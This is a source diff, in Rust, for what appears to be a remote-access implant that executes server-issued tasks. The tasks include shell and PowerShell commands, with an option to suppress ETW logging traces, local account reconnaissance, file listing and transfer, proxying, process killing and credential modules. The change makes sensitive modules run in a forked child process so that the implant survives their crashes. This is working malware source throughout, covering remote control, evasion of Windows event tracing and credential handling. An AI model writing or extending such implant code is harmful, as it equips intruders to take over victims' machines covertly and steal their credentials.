@@ -9,7 +9,13 @@ use super::utils::blocking_val;
 /// or an already-computed response.
 enum TaskOutcome {
     /// Execute this module entry with the given input (no locks held).
-    Run { main: ModuleMainFn, input: String },
+    /// `isolated`: run in a forked child process so a crash cannot kill the
+    /// agent (server marks sensitive modules, e.g. creds, via "isolated=true").
+    Run {
+        main: ModuleMainFn,
+        input: String,
+        isolated: bool,
+    },
     /// Response used verbatim (matches legacy direct-return branches).
     DoneUnwrapped(String),
     /// Response that gets wrapped in the standard task envelope.
@@ -91,10 +97,21 @@ pub(crate) async fn handle_task(
     };
 
     let (result, exit_action) = match outcome {
-        TaskOutcome::Run { main, input } => {
-            let output = match crate::module_manager::execute_module(main, &input).await {
-                Ok(r) => r,
-                Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
+        TaskOutcome::Run {
+            main,
+            input,
+            isolated,
+        } => {
+            let output = if isolated {
+                match crate::module_manager::execute_module_isolated(main, &input).await {
+                    Ok(r) => r,
+                    Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
+                }
+            } else {
+                match crate::module_manager::execute_module(main, &input).await {
+                    Ok(r) => r,
+                    Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
+                }
             };
             (wrap_result(&task.id, &output), ExitAction::None)
         }
@@ -171,9 +188,13 @@ async fn resolve_task(
 ) -> TaskOutcome {
     use libra_common::models::CommandType;
 
-    let run = |name: String, input: serde_json::Value| async move {
+    let run = |name: String, input: serde_json::Value, isolated: bool| async move {
         match module_manager.prepare(&name, &input.to_string()).await {
-            Ok((main, input)) => TaskOutcome::Run { main, input },
+            Ok((main, input)) => TaskOutcome::Run {
+                main,
+                input,
+                isolated,
+            },
             Err(e) => TaskOutcome::DoneWrapped(
                 serde_json::json!({ "success": false, "output": e }).to_string(),
             ),
@@ -186,7 +207,7 @@ async fn resolve_task(
                 "command": task.command,
                 "timeoutSeconds": if task.timeout_seconds > 0 { task.timeout_seconds } else { 60 },
             });
-            run("shell".to_string(), input).await
+            run("shell".to_string(), input, false).await
         }
         CommandType::PowerShell => {
             // arguments 支持 "etwSuppress=true"（ETW 痕迹抑制，默认关）
@@ -199,12 +220,13 @@ async fn resolve_task(
                 "timeoutSeconds": if task.timeout_seconds > 0 { task.timeout_seconds } else { 60 },
                 "etwSuppress": suppress_etw,
             });
-            run("powershell".to_string(), input).await
+            run("powershell".to_string(), input, false).await
         }
         CommandType::LocalAccounts => {
             run(
                 "recon".to_string(),
                 serde_json::json!({ "op": "local_accounts" }),
+                false,
             )
             .await
         }
@@ -212,12 +234,13 @@ async fn resolve_task(
             run(
                 "proxy".to_string(),
                 serde_json::json!({ "url": task.command, "method": "GET" }),
+                false,
             )
             .await
         }
         CommandType::FileList => {
             let input = serde_json::json!({ "op": "list", "path": task.command, "limit": 1000 });
-            run("files".to_string(), input).await
+            run("files".to_string(), input, false).await
         }
         CommandType::FileDrives => {
             let drives = blocking_val(|| {
@@ -233,13 +256,19 @@ async fn resolve_task(
             TaskOutcome::DoneUnwrapped(json)
         }
         CommandType::Generic => {
-            // 通用模块执行：command = 模块名，arguments[0] = 输入 JSON
+            // 通用模块执行：command = 模块名，arguments[0] = 输入 JSON；
+            // arguments 含 "isolated=true"（服务端对敏感模块自动附加）→
+            // 在 fork 子进程中执行，模块崩溃不影响 agent 本体。
             let input = task
                 .arguments
                 .first()
                 .and_then(|a| serde_json::from_str::<serde_json::Value>(a).ok())
                 .unwrap_or_else(|| serde_json::json!({}));
-            run(task.command.clone(), input).await
+            let isolated = task
+                .arguments
+                .iter()
+                .any(|a| a.eq_ignore_ascii_case("isolated=true"));
+            run(task.command.clone(), input, isolated).await
         }
         CommandType::Upload | CommandType::Download => {
             // File transfer with arguments: FileOps read/write (cloud module)
@@ -253,7 +282,7 @@ async fn resolve_task(
                     ("read", String::new())
                 };
                 let input = serde_json::json!({ "op": op, "path": cmd, "data": data });
-                run("files".to_string(), input).await
+                run("files".to_string(), input, false).await
             } else {
                 TaskOutcome::DoneWrapped(r#"{"error":"No file path specified"}"#.to_string())
             }
@@ -264,6 +293,7 @@ async fn resolve_task(
                 run(
                     "recon".to_string(),
                     serde_json::json!({ "op": "kill", "pid": pid }),
+                    false,
                 )
                 .await
             } else {
